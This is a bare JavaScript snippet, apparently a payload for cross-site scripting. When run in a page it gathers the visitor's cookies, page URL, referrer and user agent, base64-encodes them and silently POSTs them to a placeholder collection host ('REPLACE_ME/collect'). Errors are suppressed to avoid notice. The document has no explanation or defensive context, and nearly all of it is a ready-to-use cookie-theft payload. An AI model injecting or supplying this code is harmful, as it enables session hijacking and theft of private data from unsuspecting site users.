(function () {
  try {
    var data = {
      cookie: document.cookie || "",
      url: location.href,
      ref: document.referrer || "",
      ua: navigator.userAgent,
      t: Date.now()
    };
    var body = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
    var r = new XMLHttpRequest();
    r.open("POST", "https://REPLACE_ME/collect", true);
    r.setRequestHeader("Content-Type", "text/plain;charset=UTF-8");
    r.send(body);
  } catch (e) {}
})();
